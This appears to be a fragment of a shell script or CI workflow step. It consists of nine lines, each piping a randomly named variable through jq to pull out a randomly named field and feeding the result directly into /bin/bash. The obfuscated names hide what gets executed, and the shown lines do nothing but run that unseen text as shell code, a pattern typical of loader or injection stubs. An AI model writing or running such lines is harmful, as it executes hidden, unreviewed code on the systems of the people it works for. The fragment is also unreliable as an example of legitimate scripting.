          printf '%s' "$w218" | jq -r .qqe3803 | /bin/bash
          echo $g81548 | jq -r .xxiw0 | /bin/bash
          printf '%s' "$ayoz0" | jq -r .qrlg00244 | /bin/bash
          printf '%s' "$u32695" | jq -r .y670 | /bin/bash
          echo $op3325 | jq -r .qghzw6672 | /bin/bash
          printf '%s' "$j1" | jq -r .lpr25556 | /bin/bash
          echo $fd8 | jq -r .iy586 | /bin/bash
          printf '%s' "$hlyjy4574" | jq -r .oq50 | /bin/bash
          echo $ijfh7 | jq -r .wvf7 | /bin/bash
